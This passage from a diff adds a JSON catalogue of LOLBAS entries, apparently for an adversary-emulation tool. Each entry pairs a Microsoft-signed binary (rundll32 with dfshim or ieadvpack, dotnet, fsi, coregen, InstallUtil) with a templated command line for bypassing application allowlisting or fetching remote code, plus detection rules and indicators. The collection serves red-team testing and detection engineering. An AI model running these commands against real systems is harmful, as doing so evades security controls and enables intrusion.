+            "Elastic": "https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/defense_evasion_suspicious_managedcode_host_process.toml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml"
+          },
+          {
+            "IOC": "Execution of cmstp.exe without a VPN use case is suspicious"
+          },
+          {
+            "IOC": "DotNet CLR libraries loaded into cmstp.exe"
+          },
+          {
+            "IOC": "DotNet CLR Usage Log - cmstp.exe.log"
+          },
+          {
+            "IOC": "Registry modification to HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\cmmgr32.exe\\CmstpExtensionDll"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "INF"
+          },
+          {
+            "Execute": "Remote"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSBinaries/Cmstp.yml:0:1",
+        "source_tcodes": [
+          "T1218.003"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Operator-controlled remote infrastructure must be reachable from the authorized target."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Coregen.yml:0:2",
+      "name": "LOLBAS - T1218 - coregen.exe - AWL Bypass - Execute DLL code [d0fa85e]",
+      "description": "Binary coregen.exe (Microsoft CoreCLR Native Image Generator) loads exported function GetCLRRuntimeHost from coreclr.dll or from .DLL in arbitrary path. Coregen is located within \"C:\\Program Files (x86)\\Microsoft Silverlight\\5.1.50918.0\\\" or another version of Silverlight. Coregen is signed by Microsoft and bundled with Microsoft Silverlight.. Loads the target .DLL in arbitrary path specified with /L. Since binary is signed it can also be used to bypass application whitelisting solutions. Use case: Execute DLL code. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "coregen.exe /L #{lotl_lolbas_payload_path} dummy_assembly_name",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Coregen.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Coregen.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "coregen.exe",
+        "command_index": 2,
+        "category": "AWL Bypass",
+        "usecase": "Execute DLL code",
+        "privileges": "User",
+        "operating_system": "Windows",
+        "source_mitre_id": "T1218",
+        "full_paths": [
+          "C:\\Program Files\\Microsoft Silverlight\\5.1.50918.0\\coregen.exe",
+          "C:\\Program Files (x86)\\Microsoft Silverlight\\5.1.50918.0\\coregen.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://www.youtube.com/watch?v=75XImxOOInU",
+          "https://www.fireeye.com/blog/threat-research/2019/10/staying-hidden-on-the-endpoint-evading-detection-with-shellcode.html"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/image_load/image_load_side_load_coregen.yml"
+          },
+          {
+            "IOC": "coregen.exe loading .dll file not in \"C:\\Program Files (x86)\\Microsoft Silverlight\\5.1.50918.0\\\""
+          },
+          {
+            "IOC": "coregen.exe loading .dll file not named coreclr.dll"
+          },
+          {
+            "IOC": "coregen.exe command line containing -L or -l"
+          },
+          {
+            "IOC": "coregen.exe command line containing unexpected/invald assembly name"
+          },
+          {
+            "IOC": "coregen.exe application crash by invalid assembly name"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "DLL"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Coregen.yml:0:2",
+        "source_tcodes": [
+          "T1218"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OSLibraries/Dfshim.yml:0:0",
+      "name": "LOLBAS - T1127.002 - Dfshim.dll - AWL Bypass - Use binary to bypass Application whitelisting [53a7d73]",
+      "description": "ClickOnce engine in Windows used by .NET. Executes click-once-application from URL (trampoline for Dfsvc.exe, DotNet ClickOnce host) Use case: Use binary to bypass Application whitelisting. Privilege: User.",
+      "tactic": "Multiple",
+      "tcode": "T1127.002",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "rundll32.exe dfshim.dll,ShOpenVerbApplication #{lotl_lolbas_remote_url}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_remote_url"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OSLibraries/Dfshim.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Dfshim.yml",
+        "source_directory": "OSLibraries",
+        "source_name": "Dfshim.dll",
+        "command_index": 0,
+        "category": "AWL Bypass",
+        "usecase": "Use binary to bypass Application whitelisting",
+        "privileges": "User",
+        "operating_system": "Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11",
+        "source_mitre_id": "T1127.002",
+        "full_paths": [
+          "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Dfsvc.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\Dfsvc.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Dfsvc.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Dfsvc.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf",
+          "https://stackoverflow.com/questions/13312273/clickonce-runtime-dfsvc-exe"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "ClickOnce"
+          },
+          {
+            "Execute": "Remote"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSLibraries/Dfshim.yml:0:0",
+        "source_tcodes": [
+          "T1127.002"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Operator-controlled remote infrastructure must be reachable from the authorized target."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OSBinaries/Dfsvc.yml:0:0",
+      "name": "LOLBAS - T1127.002 - Dfsvc.exe - AWL Bypass - Use binary to bypass Application whitelisting [c6dcae5]",
+      "description": "ClickOnce engine in Windows used by .NET. Executes click-once-application from Url (trampoline for Dfsvc.exe, DotNet ClickOnce host) Use case: Use binary to bypass Application whitelisting. Privilege: User.",
+      "tactic": "Multiple",
+      "tcode": "T1127.002",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "rundll32.exe dfshim.dll,ShOpenVerbApplication #{lotl_lolbas_remote_url}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_remote_url"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OSBinaries/Dfsvc.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Dfsvc.yml",
+        "source_directory": "OSBinaries",
+        "source_name": "Dfsvc.exe",
+        "command_index": 0,
+        "category": "AWL Bypass",
+        "usecase": "Use binary to bypass Application whitelisting",
+        "privileges": "User",
+        "operating_system": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11",
+        "source_mitre_id": "T1127.002",
+        "full_paths": [
+          "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Dfsvc.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\Dfsvc.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Dfsvc.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Dfsvc.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf",
+          "https://stackoverflow.com/questions/13312273/clickonce-runtime-dfsvc-exe"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "ClickOnce"
+          },
+          {
+            "Execute": "Remote"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSBinaries/Dfsvc.yml:0:0",
+        "source_tcodes": [
+          "T1127.002"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Operator-controlled remote infrastructure must be reachable from the authorized target."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Dotnet.yml:0:0",
+      "name": "LOLBAS - T1218 - Dotnet.exe - AWL Bypass - Execute code bypassing AWL [90351b8]",
+      "description": "dotnet.exe comes with .NET Framework. dotnet.exe will execute any DLL even if applocker is enabled. Use case: Execute code bypassing AWL. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "dotnet.exe #{lotl_lolbas_payload_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Dotnet.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dotnet.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "Dotnet.exe",
+        "command_index": 0,
+        "category": "AWL Bypass",
+        "usecase": "Execute code bypassing AWL",
+        "privileges": "User",
+        "operating_system": "Windows 7 and up with .NET installed",
+        "source_mitre_id": "T1218",
+        "full_paths": [
+          "C:\\Program Files\\dotnet\\dotnet.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://twitter.com/_felamos/status/1204705548668555264",
+          "https://gist.github.com/bohops/3f645a7238d8022830ecf5511b3ecfbc",
+          "https://bohops.com/2019/08/19/dotnet-core-a-vector-for-awl-bypass-defense-evasion/",
+          "https://learn.microsoft.com/en-us/dotnet/fsharp/tools/fsharp-interactive/"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_dotnet.yml"
+          },
+          {
+            "BlockRule": "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules"
+          },
+          {
+            "IOC": "dotnet.exe spawned an unknown process"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "DLL (.NET)"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Dotnet.yml:0:0",
+        "source_tcodes": [
+          "T1218"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Dotnet.yml:0:3",
+      "name": "LOLBAS - T1218 - Dotnet.exe - AWL Bypass - Execute code bypassing AWL [78571c4]",
+      "description": "dotnet.exe comes with .NET Framework. dotnet.exe with msbuild (SDK Version) will execute unsigned code Use case: Execute code bypassing AWL. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "dotnet.exe msbuild #{lotl_lolbas_local_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Dotnet.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dotnet.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "Dotnet.exe",
+        "command_index": 3,
+        "category": "AWL Bypass",
+        "usecase": "Execute code bypassing AWL",
+        "privileges": "User",
+        "operating_system": "Windows 10 and up with .NET Core installed",
+        "source_mitre_id": "T1218",
+        "full_paths": [
+          "C:\\Program Files\\dotnet\\dotnet.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://twitter.com/_felamos/status/1204705548668555264",
+          "https://gist.github.com/bohops/3f645a7238d8022830ecf5511b3ecfbc",
+          "https://bohops.com/2019/08/19/dotnet-core-a-vector-for-awl-bypass-defense-evasion/",
+          "https://learn.microsoft.com/en-us/dotnet/fsharp/tools/fsharp-interactive/"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_dotnet.yml"
+          },
+          {
+            "BlockRule": "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules"
+          },
+          {
+            "IOC": "dotnet.exe spawned an unknown process"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "CSharp"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Dotnet.yml:0:3",
+        "source_tcodes": [
+          "T1218"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Fsi.yml:0:0",
+      "name": "LOLBAS - T1059 - Fsi.exe - AWL Bypass - Execute payload with Microsoft signed binary to bypass WDAC policies [f86a185]",
+      "description": "64-bit FSharp (F#) Interpreter included with Visual Studio and DotNet Core SDK.. Execute F# code via script file Use case: Execute payload with Microsoft signed binary to bypass WDAC policies. Privilege: User.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "fsi.exe #{lotl_lolbas_local_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Fsi.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Fsi.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "Fsi.exe",
+        "command_index": 0,
+        "category": "AWL Bypass",
+        "usecase": "Execute payload with Microsoft signed binary to bypass WDAC policies",
+        "privileges": "User",
+        "operating_system": "Windows 10 2004 (likely previous and newer versions as well)",
+        "source_mitre_id": "T1059",
+        "full_paths": [
+          "C:\\Program Files\\dotnet\\sdk\\<version>\\FSharp\\fsi.exe",
+          "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\fsi.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://twitter.com/NickTyrer/status/904273264385589248",
+          "https://bohops.com/2020/11/02/exploring-the-wdac-microsoft-recommended-block-rules-part-ii-wfc-fsi/"
+        ],
+        "detection": [
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml"
+          },
+          {
+            "BlockRule": "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules"
+          },
+          {
+            "IOC": "Fsi.exe execution may be suspicious on non-developer machines"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6b34764215b0e97e32cbc4c6325fc933d2695c3a/rules/windows/process_creation/proc_creation_win_lolbin_fsharp_interpreters.yml"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "FSharp"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Fsi.yml:0:0",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Fsi.yml:0:1",
+      "name": "LOLBAS - T1059 - Fsi.exe - AWL Bypass - Execute payload with Microsoft signed binary to bypass WDAC policies [2d9ce39]",
+      "description": "64-bit FSharp (F#) Interpreter included with Visual Studio and DotNet Core SDK.. Execute F# code via interactive command line Use case: Execute payload with Microsoft signed binary to bypass WDAC policies. Privilege: User.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "fsi.exe",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Fsi.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Fsi.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "Fsi.exe",
+        "command_index": 1,
+        "category": "AWL Bypass",
+        "usecase": "Execute payload with Microsoft signed binary to bypass WDAC policies",
+        "privileges": "User",
+        "operating_system": "Windows 10 2004 (likely previous and newer versions as well)",
+        "source_mitre_id": "T1059",
+        "full_paths": [
+          "C:\\Program Files\\dotnet\\sdk\\<version>\\FSharp\\fsi.exe",
+          "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\fsi.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://twitter.com/NickTyrer/status/904273264385589248",
+          "https://bohops.com/2020/11/02/exploring-the-wdac-microsoft-recommended-block-rules-part-ii-wfc-fsi/"
+        ],
+        "detection": [
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml"
+          },
+          {
+            "BlockRule": "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules"
+          },
+          {
+            "IOC": "Fsi.exe execution may be suspicious on non-developer machines"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6b34764215b0e97e32cbc4c6325fc933d2695c3a/rules/windows/process_creation/proc_creation_win_lolbin_fsharp_interpreters.yml"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "FSharp"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Fsi.yml:0:1",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "context": "all",
+        "readiness": "ready",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/FsiAnyCpu.yml:0:0",
+      "name": "LOLBAS - T1059 - FsiAnyCpu.exe - AWL Bypass - Execute payload with Microsoft signed binary to bypass WDAC policies [6413ae7]",
+      "description": "32/64-bit FSharp (F#) Interpreter included with Visual Studio.. Execute F# code via script file Use case: Execute payload with Microsoft signed binary to bypass WDAC policies. Privilege: User.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "fsianycpu.exe #{lotl_lolbas_local_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/FsiAnyCpu.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/FsiAnyCpu.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "FsiAnyCpu.exe",
+        "command_index": 0,
+        "category": "AWL Bypass",
+        "usecase": "Execute payload with Microsoft signed binary to bypass WDAC policies",
+        "privileges": "User",
+        "operating_system": "Windows 10 2004 (likely previous and newer versions as well)",
+        "source_mitre_id": "T1059",
+        "full_paths": [
+          "c:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\fsianycpu.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://bohops.com/2020/11/02/exploring-the-wdac-microsoft-recommended-block-rules-part-ii-wfc-fsi/"
+        ],
+        "detection": [
+          {
+            "BlockRule": "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules"
+          },
+          {
+            "IOC": "FsiAnyCpu.exe execution may be suspicious on non-developer machines"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6b34764215b0e97e32cbc4c6325fc933d2695c3a/rules/windows/process_creation/proc_creation_win_lolbin_fsharp_interpreters.yml"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "FSharp"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/FsiAnyCpu.yml:0:0",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/FsiAnyCpu.yml:0:1",
+      "name": "LOLBAS - T1059 - FsiAnyCpu.exe - AWL Bypass - Execute payload with Microsoft signed binary to bypass WDAC policies [809fa60]",
+      "description": "32/64-bit FSharp (F#) Interpreter included with Visual Studio.. Execute F# code via interactive command line Use case: Execute payload with Microsoft signed binary to bypass WDAC policies. Privilege: User.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "fsianycpu.exe",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/FsiAnyCpu.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/FsiAnyCpu.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "FsiAnyCpu.exe",
+        "command_index": 1,
+        "category": "AWL Bypass",
+        "usecase": "Execute payload with Microsoft signed binary to bypass WDAC policies",
+        "privileges": "User",
+        "operating_system": "Windows 10 2004 (likely previous and newer versions as well)",
+        "source_mitre_id": "T1059",
+        "full_paths": [
+          "c:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\Common7\\IDE\\CommonExtensions\\Microsoft\\FSharp\\fsianycpu.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://bohops.com/2020/11/02/exploring-the-wdac-microsoft-recommended-block-rules-part-ii-wfc-fsi/"
+        ],
+        "detection": [
+          {
+            "BlockRule": "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules"
+          },
+          {
+            "IOC": "FsiAnyCpu.exe execution may be suspicious on non-developer machines"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6b34764215b0e97e32cbc4c6325fc933d2695c3a/rules/windows/process_creation/proc_creation_win_lolbin_fsharp_interpreters.yml"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "FSharp"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/FsiAnyCpu.yml:0:1",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "context": "all",
+        "readiness": "ready",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OSLibraries/Ieadvpack.yml:0:1",
+      "name": "LOLBAS - T1218.011 - Ieadvpack.dll - AWL Bypass - Run local or remote script(let) code through INF file specification. [dc23667]",
+      "description": "INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.. Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied). Use case: Run local or remote script(let) code through INF file specification.. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218.011",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "rundll32.exe ieadvpack.dll,LaunchINFSection #{lotl_lolbas_payload_path},,1,",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OSLibraries/Ieadvpack.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml",
+        "source_directory": "OSLibraries",
+        "source_name": "Ieadvpack.dll",
+        "command_index": 1,
+        "category": "AWL Bypass",
+        "usecase": "Run local or remote script(let) code through INF file specification.",
+        "privileges": "User",
+        "operating_system": "Windows 10, Windows 11",
+        "source_mitre_id": "T1218.011",
+        "full_paths": [
+          "c:\\windows\\system32\\ieadvpack.dll",
+          "c:\\windows\\syswow64\\ieadvpack.dll"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/",
+          "https://twitter.com/pabraeken/status/991695411902599168",
+          "https://twitter.com/0rbz_/status/974472392012689408"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml"
+          },
+          {
+            "Splunk": "https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_rundll32_application_control_bypass___advpack.yml"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "INF"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSLibraries/Ieadvpack.yml:0:1",
+        "source_tcodes": [
+          "T1218.011"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OSLibraries/Ieadvpack.yml:0:0",
+      "name": "LOLBAS - T1218.011 - Ieadvpack.dll - AWL Bypass - Run local or remote script(let) code through INF file specification. [27421d0]",
+      "description": "INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.. Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified). Use case: Run local or remote script(let) code through INF file specification.. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218.011",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "rundll32.exe ieadvpack.dll,LaunchINFSection #{lotl_lolbas_payload_path},DefaultInstall_SingleUser,1,",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OSLibraries/Ieadvpack.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml",
+        "source_directory": "OSLibraries",
+        "source_name": "Ieadvpack.dll",
+        "command_index": 0,
+        "category": "AWL Bypass",
+        "usecase": "Run local or remote script(let) code through INF file specification.",
+        "privileges": "User",
+        "operating_system": "Windows 10, Windows 11",
+        "source_mitre_id": "T1218.011",
+        "full_paths": [
+          "c:\\windows\\system32\\ieadvpack.dll",
+          "c:\\windows\\syswow64\\ieadvpack.dll"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/",
+          "https://twitter.com/pabraeken/status/991695411902599168",
+          "https://twitter.com/0rbz_/status/974472392012689408"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml"
+          },
+          {
+            "Splunk": "https://github.com/splunk/security_content/blob/86a5b644a44240f01274c8b74d19a435c7dae66e/detections/endpoint/detect_rundll32_application_control_bypass___advpack.yml"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "INF"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSLibraries/Ieadvpack.yml:0:0",
+        "source_tcodes": [
+          "T1218.011"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OSBinaries/Installutil.yml:0:0",
+      "name": "LOLBAS - T1218.004 - Installutil.exe - AWL Bypass - Use to execute code and bypass application whitelisting [7fa2b20]",
+      "description": "The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies. Execute the target .NET DLL or EXE. Use case: Use to execute code and bypass application whitelisting. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218.004",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "InstallUtil.exe /logfile= /LogToConsole=false /U #{lotl_lolbas_payload_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OSBinaries/Installutil.yml",
